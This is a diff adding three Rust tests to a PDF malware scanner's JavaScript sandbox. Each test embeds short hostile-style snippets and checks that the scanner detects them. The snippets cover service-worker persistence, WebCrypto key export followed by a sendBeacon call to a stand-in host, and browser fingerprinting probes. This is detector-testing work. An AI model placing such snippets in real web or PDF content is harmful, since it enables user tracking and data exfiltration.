@@ -314,3 +314,69 @@ fn sandbox_emits_credential_harvest_finding() {
         Some("credential_harvest_form_emulation")
     );
 }
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_service_worker_persistence_finding() {
+    let bytes = build_minimal_js_pdf(
+        "navigator.serviceWorker.register\\('/sw.js'\\);navigator.serviceWorker.getRegistrations\\(\\);caches.open\\('v1'\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_service_worker_persistence")
+        .expect("js_runtime_service_worker_persistence finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("service_worker_persistence_abuse")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_webcrypto_key_staging_finding() {
+    let bytes = build_minimal_js_pdf(
+        "crypto.subtle.generateKey\\('AES'\\);crypto.subtle.exportKey\\('raw'\\);navigator.sendBeacon\\('https://example.invalid',\\'blob\\'\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_webcrypto_key_staging")
+        .expect("js_runtime_webcrypto_key_staging finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("webcrypto_key_staging_exfil")
+    );
+}
+
+#[cfg(feature = "js-sandbox")]
+#[test]
+fn sandbox_emits_modern_fingerprint_evasion_finding() {
+    let bytes = build_minimal_js_pdf(
+        "navigator.userAgentData.getHighEntropyValues\\(['platform'\\]\\);permissions.query\\({name:'notifications'}\\);WebGLRenderingContext.getParameter\\(37445\\);AudioContext.createAnalyser\\(\\);setTimeout\\(function\\(\\)\\{\\},1\\);",
+    );
+    let detectors: Vec<Box<dyn sis_pdf_core::detect::Detector>> =
+        vec![Box::new(JavaScriptSandboxDetector)];
+    let report = sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_opts(), &detectors)
+        .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "js_runtime_modern_fingerprint_evasion")
+        .expect("js_runtime_modern_fingerprint_evasion finding");
+    assert_eq!(
+        finding.meta.get("js.runtime.behavior.name").map(String::as_str),
+        Some("modern_fingerprint_evasion")
+    );
+}
